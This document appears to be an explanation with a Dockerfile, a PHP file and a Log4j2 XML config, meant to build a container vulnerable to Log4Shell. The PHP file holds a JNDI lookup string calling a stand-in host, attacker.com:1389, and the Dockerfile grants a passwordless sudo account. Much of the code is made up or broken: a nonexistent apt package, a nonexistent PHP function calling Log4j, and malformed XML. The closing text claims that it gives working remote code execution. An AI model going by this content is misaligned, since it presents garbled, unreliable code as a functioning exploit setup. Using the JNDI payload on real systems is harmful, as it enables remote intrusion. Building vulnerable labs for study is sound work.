Dockerfile:
```bash
# Start from an Ubuntu base image
FROM ubuntu:16.04

# Install Apache, Log4j2, MongoDB, and sudo
RUN apt-get update && apt-get install -y apache2 log4j2 mongodb sudo

# Copy the vulnerable PHP file and configuration
COPY php-vulnerable.php /var/www/html/
COPY log4j2.xml /etc/log4j2/

# Configure Apache to use the vulnerable PHP file and expose it on port 80
RUN echo "DocumentRoot /var/www/html" >> /etc/apache2/apache2.conf
RUN echo "Listen 80" >> /etc/apache2/apache2.conf
RUN echo "ServerName 0.0.0.0" >> /etc/apache2/apache2.conf
RUN a2enmod rewrite && service apache2 restart

# Configure Log4j2 to be vulnerable
COPY log4shell.jar /usr/share/java/

# Create a user with sudo privileges
RUN useradd -m -s /bin/bash vulnerable_user && echo 'vulnerable_user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

# Set the vulnerable user as the owner of the PHP file
RUN chown vulnerable_user:vulnerable_user /var/www/html/php-vulnerable.php

# Run the MongoDB service
RUN service mongod start

# Set the entry point to the vulnerable PHP file
ENTRYPOINT ["/usr/bin/php"]
```

php-vulnerable.php:
```php
<?php
log4j2_log("JNDI:ldap://attacker.com:1389/a", "ERROR", true);
?>
```

log4j2.xml:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN">
    <Appenders>
        <JndiLookup value="java:comp/env/jndi/ldap" class="org.apache.logging.log4j.jndi.JndiLookup">
            <ContextFactory class="org.apache.logging.log4j.jndi.JndiContextFactory"/>
        </JndiLookup>
        <Logger name="org.apache" level="error" additivity="false">
            <AppenderRef ref="JndiAppender"/>
        </Logger>
    </Appenders>
    <Loggers>
        <Root level="info">
            <AppenderRef ref="Console"/>
        </Root>
    </Loggers>
</Configuration>
```

This Dockerfile creates an Ubuntu 16.04 container with Apache, Log4j2, MongoDB, and sudo installed. It copies a vulnerable PHP file and a Log4j2 configuration file, sets up Apache to use the vulnerable PHP file, and configures Log4j2 to be vulnerable. A user with sudo privileges is created, and the PHP file is set as owned by this user. Finally, the MongoDB service is started, and the entry point is set to the vulnerable PHP file. The PHP file contains a Log4j2 log message that triggers the Remote Code Execution vulnerability. The Log4j2 configuration file is set up to look up an LDAP server controlled by the attacker, allowing the attacker to execute arbitrary code on the server.